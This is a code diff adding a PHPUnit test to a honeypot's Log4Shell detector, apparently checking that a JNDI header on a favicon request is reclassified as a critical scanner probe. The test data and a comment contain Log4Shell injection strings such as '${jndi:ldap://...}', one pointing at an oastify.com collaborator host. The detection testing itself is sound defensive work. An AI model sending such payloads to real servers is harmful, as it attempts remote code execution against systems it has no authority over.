@@ -213,6 +213,43 @@ final class Log4ShellSeamTest extends TestCase
     }
 
     /**
+     * The AMBIENT seam on the generalized fold (FP-0087): an amb=1 entry classifies AMBIENT with a
+     * route handle; a JNDI header is request-level evidence the fetch was not an unprompted browser
+     * fetch, so the fold bumps it to SCANNER_PROBE — handle untouched, route detection preserved,
+     * folded match and critical ceiling on top. (Honeytoken retrieval delegates to the same fold.)
+     */
+    public function test_log4shell_on_ambient_entry_bumps_to_scanner_probe(): void
+    {
+        $store = new PhpArrayStore([
+            'schema' => 1,
+            'manifest' => [],
+            'templates' => ['t-fav' => ['sev' => 'info', 'tags' => ['favicon'], 'name' => 'Favicon']],
+            'routes' => [
+                'GET /favicon.ico' => ['b' => [
+                    ['s' => 200, 'bw' => ['ICO'], 'nf' => [], 'h' => [], 'pid' => 'p', 'sev' => 'info', 'sig' => 0, 'amb' => 1, 't' => ['t-fav']],
+                ]],
+            ],
+        ]);
+        $engine = new Honeypot($store, $this->engineConfig());
+
+        $plain = $engine->classify(new RequestContext('GET', '/favicon.ico'), SiteProfile::empty());
+        self::assertSame(Verdict::AMBIENT, $plain->classification);
+        self::assertNotNull($plain->fakeHandle);
+        self::assertNotContains('log4shell', $plain->detection->tags());
+
+        $jndi = $engine->classify(
+            new RequestContext('GET', '/favicon.ico', '', ['X-Api-Version' => '${jndi:ldap://x/a}']),
+            SiteProfile::empty()
+        );
+        self::assertSame(Verdict::SCANNER_PROBE, $jndi->classification, 'an OOB witness on an ambient path is a probe');
+        self::assertNotNull($jndi->fakeHandle, 'the handle must ride through untouched');
+        self::assertSame($plain->fakeHandle->key, $jndi->fakeHandle->key);
+        self::assertContains('log4shell', $jndi->detection->tags());
+        self::assertContains('t-fav', $jndi->detection->templateIds(), 'route detection is preserved under the fold');
+        self::assertSame('critical', $jndi->severity);
+    }
+
+    /**
      * Both probes fire on one request: a JNDI lookup whose LDAP host is an OAST collaborator zone
      * (`${jndi:ldap://a.oastify.com/p}`) folds TWO matches in fixed registry order (OAST then
      * Log4Shell), ceiling critical (high OAST ⊔ critical log4shell), one Verdict, null handle.
